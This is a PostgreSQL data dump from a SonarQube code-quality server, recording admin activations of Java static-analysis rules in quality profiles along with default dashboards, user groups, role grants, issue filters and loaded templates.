INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4075, '2017-11-20 13:05:45.294', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNlObbGRdfPp-rdP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4076, '2017-11-20 13:05:45.325', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNltbbGRdfPp-rdQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4077, '2017-11-20 13:05:45.35', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNmGbbGRdfPp-rdR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4078, '2017-11-20 13:05:45.395', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNmzbbGRdfPp-rdS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4079, '2017-11-20 13:05:45.427', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNnTbbGRdfPp-rdT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4080, '2017-11-20 13:05:45.492', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNoUbbGRdfPp-rdU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4081, '2017-11-20 13:05:45.55', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNpObbGRdfPp-rdV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4082, '2017-11-20 13:05:45.6', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNqAbbGRdfPp-rdW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4083, '2017-11-20 13:05:45.693', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNrdbbGRdfPp-rdX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4084, '2017-11-20 13:05:45.731', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNsDbbGRdfPp-rdY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4085, '2017-11-20 13:05:45.747', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNsTbbGRdfPp-rdZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4086, '2017-11-20 13:05:45.769', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNspbbGRdfPp-rda');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4087, '2017-11-20 13:05:45.806', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNtObbGRdfPp-rdb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4088, '2017-11-20 13:05:45.829', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNtlbbGRdfPp-rdc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4089, '2017-11-20 13:05:45.846', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNt2bbGRdfPp-rdd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4090, '2017-11-20 13:05:45.868', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNuMbbGRdfPp-rde');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4091, '2017-11-20 13:05:45.899', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNurbbGRdfPp-rdf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4092, '2017-11-20 13:05:45.923', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNvDbbGRdfPp-rdg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4093, '2017-11-20 13:05:45.946', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNvabbGRdfPp-rdh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4094, '2017-11-20 13:05:45.963', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNvrbbGRdfPp-rdi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4095, '2017-11-20 13:05:45.979', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNv7bbGRdfPp-rdj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4096, '2017-11-20 13:05:46.002', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNwSbbGRdfPp-rdk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4097, '2017-11-20 13:05:46.027', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNwrbbGRdfPp-rdl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4098, '2017-11-20 13:23:27.551', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_11-04382:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_11-04382;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZmQ6_bbGRdfPp-rdm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4099, '2017-11-21 04:09:52.972', 'admin', 'key=java-default-egov-qualityprofile-97054:pmd:AssignmentToNonFinalStatic;ruleKey=pmd:AssignmentToNonFinalStatic;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJpLCVgt9BPyn_UJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4100, '2017-11-21 04:09:53.117', 'admin', 'key=java-default-egov-qualityprofile-97054:pmd:AvoidArrayLoops;ruleKey=pmd:AvoidArrayLoops;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJrdCVgt9BPyn_UK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4101, '2017-11-21 04:09:53.222', 'admin', 'key=java-default-egov-qualityprofile-97054:pmd:AvoidSynchronizedAtMethodLevel;ruleKey=pmd:AvoidSynchronizedAtMethodLevel;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJtGCVgt9BPyn_UL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4102, '2017-11-21 04:09:53.347', 'admin', 'key=java-default-egov-qualityprofile-97054:pmd:ImmutableField;ruleKey=pmd:ImmutableField;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJvDCVgt9BPyn_UM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4103, '2017-11-21 04:09:53.433', 'admin', 'key=java-default-egov-qualityprofile-97054:pmd:InefficientEmptyStringCheck;ruleKey=pmd:InefficientEmptyStringCheck;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJwZCVgt9BPyn_UN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4104, '2017-11-21 04:09:53.511', 'admin', 'key=java-default-egov-qualityprofile-97054:pmd:InefficientStringBuffering;ruleKey=pmd:InefficientStringBuffering;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJxnCVgt9BPyn_UO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4105, '2017-11-21 04:09:53.586', 'admin', 'key=java-default-egov-qualityprofile-97054:pmd:SimpleDateFormatNeedsLocale;ruleKey=pmd:SimpleDateFormatNeedsLocale;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJyyCVgt9BPyn_UP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4106, '2017-11-21 04:09:53.64', 'admin', 'key=java-default-egov-qualityprofile-97054:pmd:StringInstantiation;ruleKey=pmd:StringInstantiation;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJzoCVgt9BPyn_UQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4107, '2017-11-21 04:09:53.693', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJ0dCVgt9BPyn_UR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4108, '2017-11-21 04:09:53.777', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-default-egov-qualityprofile-97054;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJ1xCVgt9BPyn_US');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4109, '2017-11-21 04:09:53.86', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S00108;ruleKey=squid:S00108;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJ3ECVgt9BPyn_UT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4110, '2017-11-21 04:09:53.931', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S00112;ruleKey=squid:S00112;profileKey=java-default-egov-qualityprofile-97054;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJ4LCVgt9BPyn_UU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4111, '2017-11-21 04:09:54.042', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S00115;ruleKey=squid:S00115;profileKey=java-default-egov-qualityprofile-97054;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJ56CVgt9BPyn_UV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4112, '2017-11-21 04:09:54.134', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S00116;ruleKey=squid:S00116;profileKey=java-default-egov-qualityprofile-97054;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJ7WCVgt9BPyn_UW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4113, '2017-11-21 04:09:54.199', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S00117;ruleKey=squid:S00117;profileKey=java-default-egov-qualityprofile-97054;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJ8XCVgt9BPyn_UX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4114, '2017-11-21 04:09:54.279', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S00121;ruleKey=squid:S00121;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxJ9mCVgt9BPyn_UY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4116, '2017-11-21 04:09:54.44', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1068;ruleKey=squid:S1068;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKAICVgt9BPyn_Ua');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4117, '2017-11-21 04:09:54.489', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1125;ruleKey=squid:S1125;profileKey=java-default-egov-qualityprofile-97054;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKA5CVgt9BPyn_Ub');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4118, '2017-11-21 04:09:54.565', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1153;ruleKey=squid:S1153;profileKey=java-default-egov-qualityprofile-97054;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKCFCVgt9BPyn_Uc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4119, '2017-11-21 04:09:54.672', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1158;ruleKey=squid:S1158;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKDvCVgt9BPyn_Ud');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4120, '2017-11-21 04:09:54.751', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1170;ruleKey=squid:S1170;profileKey=java-default-egov-qualityprofile-97054;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKE-CVgt9BPyn_Ue');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4121, '2017-11-21 04:09:54.828', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1172;ruleKey=squid:S1172;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKGLCVgt9BPyn_Uf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4122, '2017-11-21 04:09:54.883', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1186;ruleKey=squid:S1186;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKHDCVgt9BPyn_Ug');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4123, '2017-11-21 04:09:54.989', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1214;ruleKey=squid:S1214;profileKey=java-default-egov-qualityprofile-97054;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKItCVgt9BPyn_Uh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4124, '2017-11-21 04:09:55.067', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1226;ruleKey=squid:S1226;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKJ7CVgt9BPyn_Ui');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4125, '2017-11-21 04:09:55.134', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1694;ruleKey=squid:S1694;profileKey=java-default-egov-qualityprofile-97054;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKK-CVgt9BPyn_Uj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4126, '2017-11-21 04:09:55.185', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1695;ruleKey=squid:S1695;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKLxCVgt9BPyn_Uk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4127, '2017-11-21 04:09:55.267', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S1858;ruleKey=squid:S1858;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKNCCVgt9BPyn_Ul');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4128, '2017-11-21 04:09:55.355', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:S2159;ruleKey=squid:S2159;profileKey=java-default-egov-qualityprofile-97054;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKObCVgt9BPyn_Um');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4129, '2017-11-21 04:09:55.432', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKPoCVgt9BPyn_Un');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4130, '2017-11-21 04:09:55.501', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKQtCVgt9BPyn_Uo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4131, '2017-11-21 04:09:55.552', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-default-egov-qualityprofile-97054;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKRgCVgt9BPyn_Up');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4132, '2017-11-21 04:09:55.599', 'admin', 'key=java-default-egov-qualityprofile-97054:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-default-egov-qualityprofile-97054;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_cxKSPCVgt9BPyn_Uq');


--
-- Data for Name: authors; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: ce_activity; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: ce_queue; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: dashboards; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO dashboards (id, user_id, name, description, column_layout, shared, created_at, updated_at, is_global) VALUES (1, NULL, 'Custom', NULL, '50%-50%', true, '2017-11-16 07:37:05.915', '2017-11-16 07:37:05.915', false);
INSERT INTO dashboards (id, user_id, name, description, column_layout, shared, created_at, updated_at, is_global) VALUES (2, NULL, 'Home', NULL, '30%-70%', true, '2017-11-16 07:37:05.937', '2017-11-16 07:37:05.937', true);


--
-- Data for Name: duplications_index; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: events; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: file_sources; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: group_roles; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO group_roles (id, group_id, resource_id, role) VALUES (1, 1, NULL, 'admin');
INSERT INTO group_roles (id, group_id, resource_id, role) VALUES (2, 1, NULL, 'profileadmin');
INSERT INTO group_roles (id, group_id, resource_id, role) VALUES (3, 1, NULL, 'shareDashboard');
INSERT INTO group_roles (id, group_id, resource_id, role) VALUES (4, NULL, NULL, 'scan');
INSERT INTO group_roles (id, group_id, resource_id, role) VALUES (6, NULL, NULL, 'provisioning');
INSERT INTO group_roles (id, group_id, resource_id, role) VALUES (7, 1, NULL, 'provisioning');
INSERT INTO group_roles (id, group_id, resource_id, role) VALUES (8, 1, NULL, 'gateadmin');


--
-- Data for Name: groups; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO groups (id, name, description, created_at, updated_at) VALUES (1, 'sonar-administrators', 'System administrators', '2017-11-16 07:36:33.018', '2017-11-16 07:36:33.018');
INSERT INTO groups (id, name, description, created_at, updated_at) VALUES (2, 'sonar-users', 'Any new users created will automatically join this group', '2017-11-16 07:36:33.227', '2017-11-16 07:36:33.227');


--
-- Data for Name: groups_users; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO groups_users (user_id, group_id) VALUES (1, 1);
INSERT INTO groups_users (user_id, group_id) VALUES (1, 2);


--
-- Data for Name: issue_changes; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: issue_filter_favourites; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: issue_filters; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO issue_filters (id, name, user_login, shared, description, data, created_at, updated_at) VALUES (1, 'Unresolved Issues', NULL, true, NULL, 'resolved=false', '2017-11-16 07:37:05.885', '2017-11-16 07:37:05.885');
INSERT INTO issue_filters (id, name, user_login, shared, description, data, created_at, updated_at) VALUES (2, 'False Positive and Won''t Fix Issues', NULL, true, NULL, 'resolutions=FALSE-POSITIVE,WONTFIX', '2017-11-16 07:37:05.885', '2017-11-16 07:37:05.885');
INSERT INTO issue_filters (id, name, user_login, shared, description, data, created_at, updated_at) VALUES (3, 'My Unresolved Issues', NULL, true, NULL, 'resolved=false|assignees=__me__', '2017-11-16 07:37:05.885', '2017-11-16 07:37:05.885');


--
-- Data for Name: issues; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: loaded_templates; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO loaded_templates (id, kee, template_type) VALUES (1, 'SonarQube way', 'QUALITY_GATE');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (2, 'cs:Sonar way', 'QUALITY_PROFILE');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (3, 'java:Sonar way', 'QUALITY_PROFILE');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (4, 'js:Sonar way', 'QUALITY_PROFILE');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (5, 'js:Sonar Security Way', 'QUALITY_PROFILE');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (6, 'Projects', 'FILTER');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (7, 'My favourites', 'FILTER');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (8, 'Unresolved Issues', 'ISSUE_FILTER');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (9, 'False Positive and Won''t Fix Issues', 'ISSUE_FILTER');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (10, 'My Unresolved Issues', 'ISSUE_FILTER');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (11, 'Custom', 'DASHBOARD');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (12, 'Home', 'DASHBOARD');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (13, 'default_template', 'PERM_TEMPLATE');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (14, 'RenameIssueWidgets', 'ONE_SHOT_TASK');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (15, 'DisplayLogOnDeprecatedProjects', 'ONE_SHOT_TASK');
INSERT INTO loaded_templates (id, kee, template_type) VALUES (16, 'ClearRulesOverloadedDebt', 'ONE_SHOT_TASK');
